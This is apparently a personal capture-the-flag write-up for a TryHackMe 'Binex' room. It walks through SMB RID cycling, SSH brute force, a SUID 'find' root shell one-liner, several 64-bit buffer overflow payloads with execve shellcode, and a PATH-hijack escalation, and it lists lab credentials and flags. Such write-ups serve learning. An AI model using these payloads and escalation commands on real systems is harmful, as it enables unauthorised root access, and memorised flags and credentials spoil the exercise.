@@ -1,0 +1,153 @@
+
+
+Binex
+======
+
+Sounds like a challenge to me... Let's see what we can find here...
+
+IP: 10.10.197.228
+
+Ok, so learnt a new thing here... i.e. RID cycling... It's something related to SMB. Seems like a good research topic...
+
+
+With RID cycling found a username: tryhackme... Let's bruteforce it... on ssh.
+
+Found the password: tryhackme:thebest
+
+Alright, exploited the find SUID: find / -exec /bin/bash -p \;
+
+Flag: THM{exploit_the_SUID}
+
+Also, found the credentials to des user...
+
+User: des
+
+Password: destructive_72656275696c64
+
+
+Buffer Overflow 
+-----------------
+
+Our buffer size was at 600 and padding by rbp must be of 8 bytes, making the final offset(to overwrite EIP) at 608 bytes...
+
+Next step we need to find any bad chars... Hopefully that won't be necessary for us... 	
+
+Ok, something strange just happened... I found the offset to be 608, but when I put the output of the following command...
+	
+	python -c "print('A'*608 + 'BBBBBB')"
+
+It did not have shown me any error, I manually tried to add some more characters and noticed that then I seem to get a SIGSEV fault... Well, I don't know, what that extra padding is for...
+
+Anyways the I guess I was successfully able to write to EIP with 616 'A's
+
+Ok, I tried using patter_create.rb script again, with a pattern length of 620 bytes, no wonder the EIP got overflow with 620  bytes and not 700 or 800 bytes.
+
+	It got me offset at 616 finally... for RIP.
+
+	Now I think... the memory is somewhat like this...
+
+		buffer
+
+		rbp
+
+		rip
+
+So, now I know, my final return address should be starting from 617th byte...
+
+Ok, so we know that now, let's see what shellcode can we use...
+
+	\x6a\x3b\x58\x48\x31\xd2\x49\xb8\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x49\xc1\xe8\x08\x41\x50\x48\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05\x6a\x3c\x58\x48\x31\xff\x0f\x05
+
+Found it from my previously attempted buffer overflows... #GithubGist
+
+Ok, so now we have this, let's insert nops in the rest of the memory
+	
+	shellcode length = 40
+
+	Space left before the return address = 616 - 40 = 576
+
+Oops I forgot the return address:
+
+	I got stuck here for a bit... Why, because I was trying to find the return address with rbp... Where rbp was overwritten... and that's why I was continuosly getting no memory address was found at 0x4141414141... Nvm
+
+Theory:
+	We know, that RBP will be overwritten with the stack... So, we need to calculate and view the memory from the other end i.e. rsp. And hence, we will subtract the memory addresses from rsp
+	
+Now we will use nops and then put some shellcode, again some nopes and then return address for our final exploit... 
+	Note: We will find the return address after the rest of the shellcode is complete so that we can accurately determine the return address for our shellcode.
+
+Almost final exploit code
+
+	python -c "print('\x90'*500 + '\x6a\x3b\x58\x48\x31\xd2\x49\xb8\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x49\xc1\xe8\x08\x41\x50\x48\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05\x6a\x3c\x58\x48\x31\xff\x0f\x05' + '\x90'*76 + 'BBBBBB')" 
+
+OK, alert... We need to copy the string inside the buffer space we can't use run $(python...) with gdb. Now, because of our shellcode made up of random non-displayable characters we are forced to use something as a place holder for our shellcode... Like 'C's so, let's put 40 C's which will make our dummy exploit be like...
+
+	python -c "print('A'*500 + 'C'*40 + 'A'*76 + 'BBBBBB')" 
+
+SOOOOOO, seems like our shellcode is starting somewhere around:
+	
+	0x7fffffffe1a0
+	For the safe side, we are gonna replace A with nops, and then use the return address some memory address backwards... Just so, when putting the final exploit in use, we have a little padding for EIP to starting executing from...
+
+
+	Address Chosen: 0x7fffffffe180
+
+	Little Endian form: \x80\xe1\xff\xff\xff\x7f
+
+Final exploit: 
+
+	python -c "print('\x90'*500 + '\x6a\x3b\x58\x48\x31\xd2\x49\xb8\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x49\xc1\xe8\x08\x41\x50\x48\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05\x6a\x3c\x58\x48\x31\xff\x0f\x05' + '\x90'*76 + '\x80\xe1\xff\xff\xff\x7f')" 
+
+Alright so fingers crossed...
+
+Nopes that didn't worked... Let's open the task now...
+
+There's a working shellcode given... Let's try that... N this shellcode is 24 bytes
+
+Final Exploit: 
+
+	(python -c "print('\x90'*500 + '\x50\x48\x31\xd2\x48\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\xb0\x3b\x0f\x05' + 'A'*92 + '\xff\xe3\xff\xff\xff\x7f' + '\x00'*2)"; cat) | ./bof
+
+Nopes, this didn't work either... I tried more but couldn't get it either... I did noticed that whenever I input 6 C's (as the return address; after 616 bytes) eip don't get overwrite... But with 5 C's it doesn't this had me wondering... I researched a bit, then found some articles on exploitdb (BOTH THE PAYLOAD's WERE ABSOLUTELY CORRECT THE ONLY PROBLEM WAS IN RETURN ADDRESS), after a few days... I get to know that RIP DOESN'T TAKE 8 BYTE ADDRESS; IT ONLY STORES 6 BYTE ADDRESSES... 
+	- That's the moment where difficulty was over... I mean for the rest of the C's the RIP was automatically assigning bytes, I just padded it with 2 \x00's at the end... So that RIP covers the whole address as one...
+
+It was the 3rd day... I SOLVED MY FIRST BUFFER OVERFLOW PROBLEM WITHOUT A WRITEUP. 
+
+MY FINAL PAYLOAD WAS NOTHING DIFFERENT FROM THE UPPER... JUST A 2 BYTES PADDING.
+
+FINALY PAYLOAD:
+
+	(python -c "print('\x90'*500 + '\x50\x48\x31\xd2\x48\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\xb0\x3b\x0f\x05' + 'A'*92 + '\xff\xe3\xff\xff\xff\x7f' + '\x00'*2)"; cat) | ./bof
+
+Also tried, 
+
+	(python -c "print('\x90'*500 + '\x6a\x3b\x58\x48\x31\xd2\x49\xb8\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x49\xc1\xe8\x08\x41\x50\x48\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05\x6a\x3c\x58\x48\x31\xff\x0f\x05' + '\x90'*76 + '\x00\xe3\xff\xff\xff\x7f' + '\00'*2)"; cat) | ./bof
+
+and worked, perfectly.
+
+
+Flag: THM{buffer_overflow_in_64_bit}
+
+username: kel
+password: kelvin_74656d7065726174757265
+
+Next is PATH exploitation...
+
+N00b's hack...
+
+cat exe.c showed me that the system is running ps as root BUT without using EXACT path. 
+
+So I edited the PATH
+	export PATH=/home/kel:$PATH
+
+This way, when the exe binary searches for ps executable in PATH, it will first view the home directory in which I am going to make a fake executable named ps (with executable permissions) with the contents:
+
+	#!/bin/bash
+
+	/bin/bash
+
+then just run the exe binary and you will get root
+
+Flag: THM{SUID_binary_and_PATH_exploit}
+
+That's it for the room.
